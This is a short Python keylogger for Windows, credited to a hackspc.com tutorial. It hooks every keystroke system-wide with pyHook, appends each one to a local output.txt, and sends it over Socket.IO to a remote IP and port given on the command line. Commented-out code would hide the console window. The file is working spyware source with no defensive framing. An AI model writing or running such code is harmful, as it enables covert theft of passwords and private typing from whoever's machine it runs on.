# http://hackspc.com/how-to-make-a-python-keylogger/
import win32api
#import win32console
#import win32gui
import sys, os
import pythoncom,pyHook
from socketIO_client import SocketIO, LoggingNamespace
 
#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)
 
def OnKeyboardEvent(event):
	if(event.Ascii == 27):
		sys.exit()
	if(event.Ascii != 0):
		#open output to append
		f=open(os.getcwd()+'\\output.txt','a')
		keylogs=chr(event.Ascii)
		if(event.Ascii==13):
			keylogs='*/n*'
		if(event.Ascii==8):
			keylogs='*BS*'
		f.write(keylogs)
		f.close()

		with SocketIO(ip, port, LoggingNamespace) as socketIO:
		    socketIO.emit('keystroke', keylogs)
		    #socketIO.wait(seconds=1)

if(len(sys.argv) == 3):
	ip = sys.argv[1]
	port = int(sys.argv[2])
else:
	ip = 'localhost'
	port = 3000
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()